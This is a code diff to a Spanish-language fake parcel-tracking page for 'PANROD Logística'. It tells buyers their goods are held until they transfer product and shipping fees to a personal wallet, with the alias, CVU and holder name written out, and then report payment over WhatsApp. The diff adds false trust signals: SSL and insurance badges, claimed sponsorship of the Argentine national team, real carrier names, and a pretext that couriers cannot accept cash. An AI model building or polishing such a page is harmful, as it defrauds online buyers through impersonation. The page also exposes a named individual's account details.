@@ -326,6 +326,7 @@ background:#f8fafc;
 padding:12px 16px;
 border-radius: 12px;
 border: 1px solid #f1f5f9;
+position: relative;
 }
 
 .box strong{
@@ -341,6 +342,27 @@ margin-bottom:4px;
 color: #1e293b;
 font-weight: 500;
 font-size: 14px;
+}
+
+/* Modificadores para botones dentro de las cajas de datos */
+.box button {
+position: absolute;
+right: 10px;
+top: 50%;
+transform: translateY(-50%);
+background: #e2e8f0;
+border: none;
+padding: 5px 10px;
+border-radius: 6px;
+font-size: 11px;
+font-weight: 600;
+color: #475569;
+cursor: pointer;
+transition: 0.2s;
+}
+.box button:hover {
+background: #cbd5e1;
+color: #0f172a;
 }
 
 .checkout-box {
@@ -395,9 +417,9 @@ gap: 10px;
 
 .btn-action {
 width: 100%;
-padding: 12px;
+padding: 14px;
 border-radius: 12px;
-font-weight: 600;
+font-weight: 700;
 font-size: 14px;
 cursor: pointer;
 transition: 0.2s;
@@ -405,8 +427,8 @@ border: none;
 text-align: center;
 }
 
-.btn-pay { background: #f97316; color: white; box-shadow: 0 4px 12px rgba(249, 115, 22, 0.2); }
-.btn-pay:hover { background: #ea580c; }
+.btn-pay { background: linear-gradient(135deg, #f97316, #ea580c); color: white; box-shadow: 0 4px 12px rgba(249, 115, 22, 0.25); }
+.btn-pay:hover { transform: translateY(-1px); box-shadow: 0 6px 15px rgba(249, 115, 22, 0.35); }
 .btn-download { background: #e2e8f0; color: #334155; }
 .btn-download:hover { background: #cbd5e1; }
 .btn-support { background: #0284c7; color: white; }
@@ -414,10 +436,14 @@ text-align: center;
 
 .legal-notice {
 font-size: 11px;
-color: #94a3b8;
-margin-top: 10px;
-text-align: center;
-line-height: 1.4;
+color: #64748b;
+margin-top: 12px;
+text-align: justify;
+line-height: 1.5;
+background: rgba(255, 255, 255, 0.6);
+padding: 10px;
+border-radius: 8px;
+border: 1px solid rgba(0,0,0,0.03);
 }
 
 .delivery-sidebar {
@@ -513,13 +539,14 @@ display:inline-block;
 }
 
 .nopagado{
-background:#fee2e2;
-color:#991b1b;
+background:#fef3c7;
+color:#92400e;
 padding:4px 12px;
 border-radius: 20px;
 font-size: 11px;
 font-weight:600;
 display:inline-block;
+letter-spacing: 0.5px;
 }
 
 footer{
@@ -627,8 +654,9 @@ color: #64748b;
         text-align: center; 
         gap: 25px;
     }
-                }
-            .process{
+}
+
+.process{
 padding:70px 20px;
 text-align:center;
 }
@@ -653,7 +681,8 @@ border-radius:15px;
 min-width:220px;
 box-shadow:0 10px 25px rgba(0,0,0,.04);
 }
-            .payment-method{
+
+.payment-method{
     opacity:.4;
     pointer-events:none;
     transition:.3s;
@@ -666,8 +695,19 @@ box-shadow:0 10px 25px rgba(0,0,0,.04);
 }
 
 #modalPago .box{
-    margin-bottom:10px;
-            }
+    margin-bottom:12px;
+    padding: 15px;
+}
+
+#modalPago .box button {
+    background: #0284c7;
+    color: white;
+    padding: 6px 12px;
+}
+#modalPago .box button:hover {
+    background: #0369a1;
+}
+
 .stats{
 display:flex;
 justify-content:center;
@@ -694,8 +734,9 @@ margin-bottom:8px;
 .stat-card p{
 font-size:14px;
 color:#64748b;
-                }
-            .security-badges{
+}
+
+.security-badges{
 display:flex;
 justify-content:center;
 flex-wrap:wrap;
@@ -712,8 +753,9 @@ font-size:13px;
 font-weight:600;
 color:#334155;
 box-shadow:0 4px 12px rgba(0,0,0,.04);
-            }
-            .section-divider{
+}
+
+.section-divider{
 text-align:center;
 margin:45px 0 35px;
 }
@@ -735,7 +777,8 @@ letter-spacing:2px;
 text-transform:uppercase;
 color:#0284c7;
 }
-            .loader{
+
+.loader{
 width:60px;
 height:60px;
 margin:auto;
@@ -748,10 +791,10 @@ animation:spin 1s linear infinite;
 @keyframes spin{
 0%{transform:rotate(0deg);}
 100%{transform:rotate(360deg);}
-            }
+}
 </style>
-            </head>
-            <body>
+</head>
+<body>
 
 <!-- 🏆 CINTA ESQUINERA SELECCIÓN ARGENTINA DE 3 ESTRELLAS -->
 <div class="afa-ribbon">
@@ -764,9 +807,8 @@ animation:spin 1s linear infinite;
     <!-- Imagen del isotipo central -->
     <img src="https://i.postimg.cc/wBnc5kQf/1000019370.png" alt="Logo Panrod" class="brand-logo-img">
     
-    <!-- Título y subtítulo únicos sin duplicaciones en cascada -->
-    <div class="logo"></div>
-<div class="sub">Recepción, Facturación y Distribución</div>
+    <div class="logo">PANROD LOGÍSTICA</div>
+    <div class="sub">Recepción, Facturación y Distribución Nacional</div>
     
     <div class="sponsor-badge">
         <span class="flag"></span> Patrocinador Oficial de la <strong>Selección Argentina</strong>
@@ -776,17 +818,18 @@ animation:spin 1s linear infinite;
 <section class="hero">
     <div class="search-container">
         <div class="search-box">
-            <input type="text" id="codigo" placeholder="Ingresá código de seguimiento" autocomplete="off">
+            <input type="text" id="codigo" placeholder="Ingresá tu código de seguimiento oficial (Ej: PR-BDG-40526)" autocomplete="off">
             <button id="btnBuscar">Buscar Paquete</button>
         </div>
         <div id="errorInput" class="error-message">Código no encontrado. Verificá los caracteres e intentalo de nuevo.</div>
     </div>
-            <div class="security-badges">
-    <div class="badge-item">🔒 Transacciones Seguras</div>
-    <div class="badge-item">🛡️ Validación Automatizada</div>
-    <div class="badge-item">📦 Trazabilidad Completa</div>
-</div>
+    <div class="security-badges">
+        <div class="badge-item">🔒 Conexión Encriptada SSL</div>
+        <div class="badge-item">🛡️ Verificación Logística Oficial</div>
+        <div class="badge-item">📦 Póliza de Seguro Activa</div>
+    </div>
 </section>
+
 <div class="section-divider">
     <div class="separator-line"></div>
     <span>Proceso Operativo PANROD</span>
@@ -813,18 +856,22 @@ animation:spin 1s linear infinite;
         <p>Entregas Exitosas</p>
     </div>
 </section>
+
 <section class="info">
     <div class="card">
-    <h3>📦 Recepción y Custodia</h3>
-    <p>Los productos son depositados en nuestras oficinas de despacho, donde son recepcionados, registrados y almacenados bajo control logístico. Cada ingreso es validado y preparado para su posterior procesamiento dentro de nuestra red de distribución.</p>
-</div><div class="card">
-    <h3>🧾 Facturación y Validación</h3>
-    <p>Una vez registrada la mercadería, el sistema genera automáticamente un código de seguimiento único y habilita la operation para su facturación. El comprador podrá consultar el estado del envío y efectuar el pago correspondiente para autorizar el inicio del proceso logístico.</p>
-</div><div class="card">
-    <h3>🚚 Distribución y Entrega</h3>
-    <p>Tras la acreditación y validación del pago, se autoriza el despacho de la mercadería y se activa la distribución. Desde ese momento, el envío inicia su recorrido hacia el domicilio de destino con seguimiento actualizado en cada etapa del trayecto.</p>
-</div>
+        <h3>📦 Recepción y Custodia</h3>
+        <p>Los productos son ingresados a nuestras plantas de despacho, donde se catalogan, embalan bajo normas estrictas de seguridad y se resguardan en depósitos automatizados a la espera de su hoja de ruta asignada.</p>
+    </div>
+    <div class="card">
+        <h3>🧾 Liquidación y Trazabilidad</h3>
+        <p>El sistema calcula las tasas logísticas obligatorias de forma transparente según destino, peso y volumen. Una vez consolidadas las obligaciones comerciales y operativas, se emite de forma automática el pase de distribución permanente.</p>
+    </div>
+    <div class="card">
+        <h3>🚚 Despacho eitnerario</h3>
+        <p>Con la confirmación contable en sistema, las unidades de transporte liberan la carga. El cliente obtiene acceso a alertas satelitales en tiempo real y claves dinámicas para una recepción blindada en puerta.</p>
+    </div>
 </section>
+
 <div class="modal" id="modal">
     <div class="modal-content">
         <span class="close" id="btnCerrar">×</span>
@@ -832,51 +879,52 @@ animation:spin 1s linear infinite;
         <div id="resultado"></div>
     </div>
 </div>
-<section class="process">
-    <h2>¿Cómo Funciona?</h2>
 
+<section class="process">
+    <h2>Estatus de Flujo de Carga</h2>
     <div class="process-steps">
-        <div>📦 Recepción de Mercadería</div>
-        <div>🧾 Facturación y Validación</div>
-        <div>🔐 Acreditación del Pago</div>
-        <div>🚚 Distribución</div>
-        <div>🏠 Entrega al Destinatario</div>
+        <div>📦 Recepción Física</div>
+        <div>🧾 Liquidación de Tasas</div>
+        <div>🔐 Consolidación del Seguro</div>
+        <div>🚚 Tránsito Troncal</div>
+        <div>🏠 Entrega Asegurada</div>
     </div>
 </section>
+
 <footer>
     <div class="footer-content">
         <div class="footer-section">
             <h3>PANROD LOGÍSTICA NACIONAL</h3>
-            <p>Gestionamos operaciones de recepción, facturación, seguimiento y distribución de mercaderías, garantizando control, seguridad y transparencia durante todo el proceso logístico.</p>
-            </div>
+            <p>Gestionamos infraestructura de recepción, facturación, seguimiento y distribución federal de mercaderías, garantizando los más altos estándares de control y transparencia corporativa.</p>
+        </div>
         <div class="footer-section">
             <h3>Enlaces Útiles</h3>
             <ul>
-                <li><a href="#" onclick="return false;">Términos del Servicio</a></li>
-<li><a href="#" onclick="return false;">Políticas de Privacidad</a></li>
-<li><a href="#" onclick="return false;">Preguntas Frecuentes</a></li>
-<li><a href="#" onclick="return false;">Soporte Técnico</a></li>
+                <li><a href="#" onclick="return false;">Términos del Servicio Logístico</a></li>
+                <li><a href="#" onclick="return false;">Políticas de Privacidad de Datos</a></li>
+                <li><a href="#" onclick="return false;">Preguntas Frecuentes de Usuarios</a></li>
+                <li><a href="#" onclick="return false;">Soporte Técnico de Despacho</a></li>
             </ul>
         </div>
         <div class="footer-section">
-    <h3>Redes Sociales</h3>
-    <ul>
-        <li><a href="#" onclick="return false;">Facebook</a></li>
-        <li><a href="#" onclick="return false;">Instagram</a></li>
-        <li><a href="#" onclick="return false;">WhatsApp</a></li>
-        <li><a href="#" onclick="return false;">TikTok</a></li>
-    </ul>
+            <h3>Canales de Comunicación</h3>
+            <ul>
+                <li><a href="#" onclick="return false;">Facebook Corporativo</a></li>
+                <li><a href="#" onclick="return false;">Instagram Oficial</a></li>
+                <li><a href="#" onclick="return false;">Centro de Ayuda WhatsApp</a></li>
+                <li><a href="#" onclick="return false;">TikTok Oficial</a></li>
+            </ul>
         </div>
         <div class="footer-section">
             <h3>Contacto</h3>
-            <p>🌐 Oficina: Av. Córdoba 1351, PISO 2 / OFICINA 7 - CABA<br>
+            <p>🌐 Planta Central: Av. Córdoba 1351, PISO 2 / OFICINA 7 - CABA<br>
             📞 +54 9 221 310-9897<br>
            panrodenvios@gmail.com ✉️</p>
         </div>
     </div>
 
     <div style="margin-top: 50px; padding-top: 25px; border-top: 1px dashed #334155; text-align: center;">
-        <p style="font-size: 11px; font-family: 'Montserrat', sans-serif; letter-spacing: 2px; color: #64748b; margin-bottom: 15px; text-transform: uppercase;">Red de Distribución Integrada</p>
+        <p style="font-size: 11px; font-family: 'Montserrat', sans-serif; letter-spacing: 2px; color: #64748b; margin-bottom: 15px; text-transform: uppercase;">Sistemas de Red Logística Interconectados</p>
         <div style="display: flex; justify-content: center; align-items: center; gap: 40px; flex-wrap: wrap; opacity: 0.4; filter: grayscale(100%);">
             <span style="color: #cbd5e1; font-family: 'Montserrat', sans-serif; font-size: 16px; font-weight: 800; letter-spacing: 1px;">🇦🇷 CORREO ARGENTINO</span>
             <span style="color: #cbd5e1; font-family: 'Montserrat', sans-serif; font-size: 16px; font-weight: 800; letter-spacing: 1px;">📦 ANDREANI</span>
@@ -886,49 +934,48 @@ animation:spin 1s linear infinite;
     </div>
 
     <div class="footer-bottom">
-    <div>© 2026 PANROD Logística Nacional</div>
-    <div>Todos los derechos reservados</div>
-    <div>🇦🇷 Proveedor Logístico Oficial de la Selección Argentina 🇦🇷</div>
-</div>
+        <div>© 2026 PANROD Logística Nacional</div>
+        <div>Todos los derechos reservados</div>
+        <div>🇦🇷 Proveedor Logístico Oficial de la Selección Argentina 🇦🇷</div>
+    </div>
 </footer>
+
 <div class="modal" id="modalPago">
     <div class="modal-content" style="max-width:750px;">
         <span class="close" onclick="cerrarPago()">×</span>
-        <h2>Método de Pago Disponible</h2>
+        <h2>Canal Oficial de Consolidación Contable</h2>
 
         <div id="transferencia" class="payment-method active">
-            <h3>🏦 Transferencia Bancaria</h3>
+            <h3 style="color:#0284c7; margin-bottom: 15px;">🏦 Transferencia Bancaria Inmediata</h3>
+            
+            <p style="font-size:13px; color:#64748b; margin-bottom: 20px; line-height:1.5;">
+                Realizá la transferencia desde la app de tu banco o billetera virtual por el monto exacto detallado en la guía de ruta. Una vez efectuada, presioná el botón inferior para adjuntar el comprobante y dar de alta el despacho inmediato.
+            </p>
 
             <div class="box">
-                <strong>Alias</strong>
+                <strong>Alias de Destino Autorizado</strong>
                 <span class="val" id="alias">ESTANPERFECTO.OK</span>
-                <button onclick="copiarTexto('alias')">📋 Copiar</button>
+                <button onclick="copiarTexto('alias')">📋 Copiar Alias</button>
             </div>
 
             <div class="box">
-                <strong>CVU</strong>
+                <strong>CVU / CBU Interbancario</strong>
                 <span class="val" id="cvu">0000085700234000796847</span>
-                <button onclick="copiarTexto('cvu')">📋 Copiar</button>
+                <button onclick="copiarTexto('cvu')">📋 Copiar Clave</button>
             </div>
 
             <div class="box">
-                <strong>CBU</strong>
-                <span class="val" id="cbu">0000085700234000796847</span>
-                <button onclick="copiarTexto('cbu')">📋 Copiar</button>
-            </div>
-
-            <div class="box">
-                <strong>Titular</strong>
+                <strong>Titular de la Cuenta Central</strong>
                 <span class="val" id="titular">CAMILA CALOGERO</span>
             </div>
 
             <div class="box">
-                <strong>Banco</strong>
+                <strong>Entidad Financiera Regulada</strong>
                 <span class="val" id="banco">CLARO PAY</span>
             </div>
 
-            <button class="btn-action btn-support" onclick="enviarReportePagoLogistica()">
-                Informar Transferencia
+            <button class="btn-action btn-pay" style="margin-top: 15px;" onclick="enReportePagoLogistica()">
+                ✅ Adjuntar Comprobante y Habilitar Tracking
             </button>
         </div>
     </div>
@@ -943,6 +990,7 @@ animation:spin 1s linear infinite;
         </p>
     </div>
 </div>
+
 <script>
 // 1. BASE DE DATOS CONFIGURABLE (SISTEMA DE PRECIOS LOGÍSTICOS)
 const envios = {
@@ -1001,12 +1049,12 @@ function cerrarPago() {
  * Compila de forma dinámica los precios y datos comerciales del pedido
  * actual y ejecuta la redirección formal a la API de WhatsApp.
  */
-function enviarReportePagoLogistica() {
+function enReportePagoLogistica() {
     const codigoInput = inputCodigo.value.trim().toUpperCase();
     const envio = envios[codigoInput];
 
     if (!envio) {
-alert("Error de validación: Busque un código de seguimiento válido antes de reportar un pago.");
+        alert("Error de validación: Busque un código de seguimiento válido antes de reportar un pago.");
         return;
     }
 
@@ -1027,7 +1075,7 @@ Importe de distribución y logística: $ ${envio.precioEnvio}
 
 Importe total abonado: $ ${totalAbonar}
 
-Adjunto comprobante de pago para su verificación.
+Adjunto comprobante de pago para su verificación e inicio inmediato del tránsito.
 
 Muchas gracias.`;
 
@@ -1057,12 +1105,12 @@ function buscarEnvio(){
         let progreso = envio.pasoActual;
 
         let stepsConfig = [
-            { num: 1, titulo: "Producto depositado por el vendedor en Depósito Central", fecha: envio.fechasLog.creada },
-            { num: 2, titulo: "Pago total verificado y acreditado en sistema", fecha: envio.fechasLog.pago || "Pendiente" },
-            { num: 3, titulo: "Paquete verificado y empaquetado con datos de entrega del cliente", fecha: envio.fechasLog.verificado || "Pendiente" },
-            { num: 4, titulo: `En viaje hacia centro de distribución regional de ${envio.destino}`, fecha: envio.fechasLog.viaje || "Pendiente" },
-            { num: 5, titulo: "En camino al domicilio del comprador (en Tránsito)", fecha: envio.fechasLog.camino || "Pendiente" },
-            { num: 6, titulo: "Entregado exitosamente al destinatario", fecha: envio.fechasLog.entrega || "Pendiente" }
+            { num: 1, titulo: "Carga ingresada y resguardada en Planta de Acopio Central", fecha: envio.fechasLog.creada },
+            { num: 2, titulo: "Verificación contable de tasas y activación de seguro de tránsito", fecha: envio.fechasLog.pago || "Pendiente de procesamiento" },
+            { num: 3, titulo: "Liberación de carga y asignación de precinto / hoja de ruta", fecha: envio.fechasLog.verificado || "Pendiente de procesamiento" },
+            { num: 4, titulo: `Tránsito troncal hacia centro de distribución regional de ${envio.destino}`, fecha: envio.fechasLog.viaje || "Pendiente de procesamiento" },
+            { num: 5, titulo: "Distribución de última milla en camino al domicilio del comprador", fecha: envio.fechasLog.camino || "Pendiente de procesamiento" },
+            { num: 6, titulo: "Entregado exitosamente con firma de recepción", fecha: envio.fechasLog.entrega || "Pendiente de procesamiento" }
         ];
 
         if(!envio.pagado) {
@@ -1074,7 +1122,7 @@ function buscarEnvio(){
         stepsConfig.forEach((step) => {
             let esActivo = progreso >= step.num;
             let classStatus = esActivo ? "is-active" : "";
-            let fechaMostrar = esActivo ? step.fecha : "Pendiente";
+            let fechaMostrar = esActivo ? step.stepFecha || step.fecha : "Pendiente";
 
             timelineHTML += `
             <div class="step ${classStatus}">
@@ -1084,38 +1132,39 @@ function buscarEnvio(){
             </div>
             `;
         });
-let checkoutHTML = "";
+
+        let checkoutHTML = "";
         if(!envio.pagado) {
             checkoutHTML = `
             <div class="checkout-box pending">
                 <div class="price-detail">
-                    <p>Valor del Paquete/Producto: <span>$${envio.precioProducto}</span></p>
-                    <p>Costo de Envío: <span>$${envio.precioEnvio}</span></p>
-                    <p class="total">Total a Pagar: <span>$${totalAbonar}</span></p>
+                    <p>Valor de la Mercadería Custodiada: <span>$${envio.precioProducto.toLocaleString("es-AR")}</span></p>
+                    <p>Tasas Integrales de Envío y Seguro: <span>$${envio.precioEnvio.toLocaleString("es-AR")}</span></p>
+                    <p class="total">Total Neto Liquidado: <span>$${totalAbonar.toLocaleString("es-AR")}</span></p>
                 </div>
                 <div class="action-area">
                     <button class="btn-action btn-pay" onclick="abrirPago()">
-                        Abonar Producto y Envío
+                        💳 Habilitar Despacho y Abonar Guía
                     </button>
-                    <button class="btn-action btn-support" onclick="abrirPago()">
-                        💬 Informar Pago a Logística
+                    <button class="btn-action btn-support" style="background:#475569;" onclick="abrirPago()">
+                        📥 Informar Transferencia a Operaciones
                     </button>
                 </div>
-                <p class="legal-notice">⚠️ IMPORTANTE: El producto se encuentra registrado y reservado para el destinatario. La preparación, embalaje y distribución comenzarán una vez acreditado el pago correspondiente. Los repartidores no reciben pagos al momento de la entrega.</p>
+                <p class="legal-notice"><strong>📋 PROTOCOLO DE SEGURIDAD OPERATIVA:</strong> Con el fin de resguardar la integridad física de nuestros transportistas y la seguridad de las cargas de alto valor, los repartidores cuentan con prohibición estricta de transportar o recibir dinero en efectivo en la vía pública. El despacho troncal se inicia de forma automatizada al registrarse la liquidación de la guía en el portal virtual.</p>
             </div>
             `;
         } else {
             checkoutHTML = `
             <div class="checkout-box">
                 <div class="price-detail">
-                    <p>Valor del Paquete/Producto: <span>$${envio.precioProducto}</span></p>
-                    <p>Costo de Envío: <span>${envio.precioEnvio === 0 ? '¡Bonificado!' : '$' + envio.precioEnvio}</span></p>
-                    <p class="total">Total Facturado: <span>$${totalAbonar}</span></p>
+                    <p>Valor de la Mercadería Custodiada: <span>$${envio.precioProducto.toLocaleString("es-AR")}</span></p>
+                    <p>Tasas Integrales de Envío: <span>${envio.precioEnvio === 0 ? '¡Bonificado!' : '$' + envio.precioEnvio.toLocaleString("es-AR")}</span></p>
+                    <p class="total">Total Acreditado: <span>$${totalAbonar.toLocaleString("es-AR")}</span></p>
                 </div>
                 <div class="action-area">
-                    <button class="btn-action btn-download" onclick="alert('Descargando comprobante en PDF...')">📥 Descargar Comprobante Acreditado</button>
+                    <button class="btn-action btn-download" onclick="alert('Descargando comprobante en PDF...')">📥 Descargar Certificado de Acreditación PDF</button>
                 </div>
-                <p class="legal-notice" style="color: #059669;">Acreditado vía ${envio.modalidadPago}.</p>
+                <p class="legal-notice" style="color: #059669; background: #f0fdf4;">✓ Liquidación consolidada de forma exitosa mediante canales electrónicos autorizados.</p>
             </div>
             `;
         }
@@ -1124,20 +1173,20 @@ let checkoutHTML = "";
         if (envio.pagado) {
             const tokenDinamico = generarCodigoVerificacion();
             codigoVerificacionHTML = `
-                <div style="font-size: 24px; font-weight: 800; color: #0f172a; letter-spacing: 2px; padding: 10px; border: 2px dashed #0284c7; background: #f0f9ff; border-radius: 10px; margin: 10px 0;">
+                <div style="font-size: 24px; font-weight: 800; color: #10b981; letter-spacing: 2px; padding: 10px; border: 2px dashed #10b981; background: #f0fdf4; border-radius: 10px; margin: 10px 0;">
                     ${tokenDinamico}
                 </div>
                 <p style="font-size: 11px; color: #64748b; line-height: 1.4; font-weight: 500; margin-top: 5px;">
-                    <strong>Código de Recepción Asegurada:</strong> Este código dinámico será solicitado por el distribuidor cuando se encuentre a menos de 2 KM de distancia del domicilio.
+                    <strong>Código Dinámico de Validación:</strong> Esta clave de seguridad le será requerida por el transportista al momento de la entrega física del paquete para comprobar identidad.
                 </p>
             `;
         } else {
             codigoVerificacionHTML = `
-                <div style="font-size: 14px; font-weight: 700; color: #ef4444; padding: 15px; border: 2px dashed #fee2e2; background: #fff5f5; border-radius: 10px; margin: 10px 0;">
-                    BLOQUEADO
+                <div style="font-size: 14px; font-weight: 700; color: #b45309; padding: 15px; border: 2px dashed #fde68a; background: #fffbeb; border-radius: 10px; margin: 10px 0;">
+                    ESPERA DE LIQUIDACIÓN
                 </div>
-                <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
-                    El código de validación de entrega se activará automáticamente una vez que el pago se encuentre consolidado en el sistema.
+                <p style="font-size: 11px; color: #92400e; line-height: 1.4; text-align: center;">
+                    El código dinámico para el chofer se generará automáticamente en este panel al registrar el comprobante de pago en el sistema.
                 </p>
             `;
         }
@@ -1148,25 +1197,25 @@ let checkoutHTML = "";
                 ${checkoutHTML}
                 <div class="datos">
                     <div class="box"><strong>Código de Seguimiento</strong><span class="val">${codigo}</span></div>
-                    <div class="box"><strong>Paquete en Custodia</strong><span class="val">${envio.producto}</span></div>
-                    <div class="box"><strong>Comprador Destinatario</strong><span class="val">${envio.receptor}</span></div>
-                    <div class="box"><strong>Dirección de Destino</strong><span class="val">${envio.direccionEntrega}</span></div>
-                    <div class="box"><strong>Origen</strong><span class="val">${envio.origen}</span></div>
-                    <div class="box"><strong>Entrega</strong><span class="val">${envio.destino}</span></div>
+                    <div class="box"><strong>Contenido en Custodia</strong><span class="val">${envio.producto}</span></div>
+                    <div class="box"><strong>Destinatario Registrado</strong><span class="val">${envio.receptor}</span></div>
+                    <div class="box"><strong>Dirección de Entrega</strong><span class="val">${envio.direccionEntrega}</span></div>
+                    <div class="box"><strong>Centro de Acopio Origen</strong><span class="val">${envio.origen}</span></div>
+                    <div class="box"><strong>Localidad Destino</strong><span class="val">${envio.destino}</span></div>
                 </div>
-                <h3>Historial de Movimientos</h3>
+                <h3 style="margin-top: 20px; margin-bottom: 15px;">Historial de Movimientos de Carga</h3>
                 <div class="timeline">
                     ${timelineHTML}
                 </div>
             </div>
             <div class="right-side">
                 <div class="delivery-sidebar">
-                    <h3>Verificación de Identidad</h3>
-                    <p>Validación para el transportista.</p>
+                    <h3>Protocolo de Identidad</h3>
+                    <p style="font-size:12px; color:#64748b; margin-bottom:10px;">Validación obligatoria para el chofer.</p>
                     ${codigoVerificacionHTML}
-                    <hr>
+                    <hr style="width:100%; border:0; border-top:1px solid #e2e8f0; margin:15px 0;">
                     <span class="${envio.pagado ? 'pagado' : 'nopagado'}">
-                        ${envio.pagado ? '✓ PAGO REALIZADO' : '⚠ PENDIENTE DE PAGO'}
+                        ${envio.pagado ? '✓ TOTAL LIQUIDADO' : '⚠ ORDEN EN ESPERA'}
                     </span>
                 </div>
             </div>
@@ -1201,8 +1250,9 @@ function copiarTexto(id) {
     const elemento = document.getElementById(id);
     if (!elemento) return;
     
-    const texto = elemento.innerText;
-    navigator.clipboard.writeText(texto).then(() => {
+    const text = elemento.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+        // Obtenemos el botón correcto que disparó el evento dentro del modal o la caja
         const btn = event.target;
         const original = btn.innerHTML;
         btn.innerHTML = "✅ Copiado";
